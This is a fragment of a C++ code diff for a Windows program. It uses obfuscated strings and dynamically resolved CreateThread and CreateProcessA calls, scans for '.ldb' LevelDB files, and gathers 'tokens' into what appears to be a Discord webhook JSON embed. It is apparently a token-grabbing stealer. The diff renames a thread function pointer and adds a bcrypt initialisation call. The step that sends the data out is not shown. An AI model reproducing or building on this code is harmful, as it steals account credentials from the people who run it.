@@ -1,7 +1,5 @@
 #include <iostream>
 
-#include <skcrypt/skcrypt.hpp>
-
 #include <shlobj_core.h>
 #include <filesystem>
 #include <fstream>
@@ -36,7 +34,7 @@ int main(int argc, char** argv) {
 		return 0;
 	}
 
-	CreateThreadCustom createThreadCustom = (CreateThreadCustom)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("CreateThread"));
+	CreateThreadCustom CreateThreadA = (CreateThreadCustom)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("CreateThread"));
 	CreateProcessCustom CreateProcessA = (CreateProcessCustom)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("CreateProcessA"));
 
 	for (int i = 0; i < argc; i++) {
@@ -136,7 +134,7 @@ int main(int argc, char** argv) {
 			if (!file.extension().filename().string().compare(skCrypt(".ldb"))) {
 				std::string s = file.string();
 
-				HANDLE hThread = createThreadCustom(nullptr, 0, (LPTHREAD_START_ROUTINE)Thread, static_cast<void*>(&s), 0, nullptr);
+				HANDLE hThread = CreateThreadA(nullptr, 0, (LPTHREAD_START_ROUTINE)Thread, static_cast<void*>(&s), 0, nullptr);
 				threads.push_back(hThread);
 				Sleep(25);
 			}
@@ -157,6 +155,8 @@ int main(int argc, char** argv) {
 		  "color": null,
 		  "fields": [
 	)"));
+
+	bcrypt::init();
 
 	int i = 0;
 	for (auto& str : tokens) {
